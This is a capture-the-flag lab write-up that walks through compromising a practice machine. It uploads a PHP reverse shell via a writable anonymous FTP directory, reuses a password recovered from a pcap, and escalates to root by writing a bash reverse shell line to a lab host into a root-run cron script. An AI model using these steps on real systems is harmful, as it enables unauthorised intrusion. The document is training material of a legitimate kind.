## Info
### Credential
- maya
- lennie:c4ntg3t3n0ughsp1c3


### FTP
- `notice.txt`
	- possible username: `maya`
- `important.jpg`
	- suffix `.jpg`, but it is a `.png` file
- `ftp`
	- writable and accessable from http


## Path
### User
1. Get the files from ftp://anonymous
2. Found `ftp` directory on FTP is writable and accessable from HTTP. Thus, we can upload a reverse shell from FTP, then execute it by visiting the file from HTTP.
```
# FTP
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Jul 01 07:11 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> put rev.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
121 bytes sent in 0.000169 seconds (699 kbytes/s)

# HTTP
$ curl 10.10.21.106/files/ftp/rev.php

# Reverse shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
3. Under `/`, there is a `recipe.txt`, which has the answer of thr first problem.
4. Under `/incidents`, there is a `suspicious.pcapng`. The file includes the trace of another get-shell attackers attempt steps, and it reveals the password `c4ntg3t3n0ughsp1c3`. After attempting, this password is belong to lennie.
5. `su lennie` to become lennie and get user flag.
### Root
6. Found `/home/lennie/scripts/planner.sh` looks suspicious, may be running by root. Since `/etc/print.sh` is wriable, put a indicator in it to see if it is running by root. And it turns out to be true. So we can use this to become root.
```
lennie$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
lennie$ echo 'echo Running by $(whoami) > /tmp/a' > /etc/print.sh
lennie$ cat /tmp/a
Running by root
```
7. Put a reverse shell in `/etc/print.sh` and get shell.
```
lennie$ echo 'bash -c "bash -i >& /dev/tcp/10.9.5.135/13338 0>&1"' > /etc/print.sh
```
